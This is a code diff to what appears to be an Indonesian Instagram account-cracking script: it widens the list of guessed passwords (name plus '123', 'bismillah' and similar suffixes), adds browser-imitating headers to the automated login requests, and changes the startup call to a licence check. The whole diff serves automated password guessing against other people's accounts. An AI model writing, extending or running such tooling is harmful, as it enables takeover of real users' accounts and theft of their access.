@@ -590,9 +590,9 @@ class instagram:
                                     sandi = [w+'123',w]
                             elif o == "2":
                                 if len(w) == 3 or len(w) == 4 or len(w) == 5:
-                                    sandi = [w, w+'123', w+'1234', w+'12345']
+                                    sandi = [w, w+'123', w+'1234', w, w+ 'bismillah', w+'12345']
                                 else:
-                                    sandi = [w+'123', w, w+'1234', w+'12345']
+                                    sandi = [w+'123', w, w+'1234', w, w+ 'bismillah', w+'12345']
                             elif o == "3":
                                 if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                     sandi = [w, w+'123', w+'1234', w +'12345', w+'123456', password.lower()]
@@ -646,10 +646,12 @@ class instagram:
                     'Connection': 'keep-alive',
                     'x-ig-www-claim':'0',
                     'x-instagram-ajax': '9080db6b6a51',
+                    "viewport-width": "360",
                     'content-type': 'application/x-www-form-urlencoded',
                     'accept': '*/*',
                     'x-requested-with': 'XMLHttpRequest',
                     'x-asbd-id': '198387',
+                    "save-data": "on",
                     'user-agent': ua,
                     'x-csrftoken': token.cookies['csrftoken'],
                     'x-ig-app-id': '1217981644879628',
@@ -972,7 +974,7 @@ def massal(self):
 
 if __name__=='__main__':
     try:
-        login_kamu()
+        lisensi()
     except requests.exceptions.ConnectionError:
         exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
         
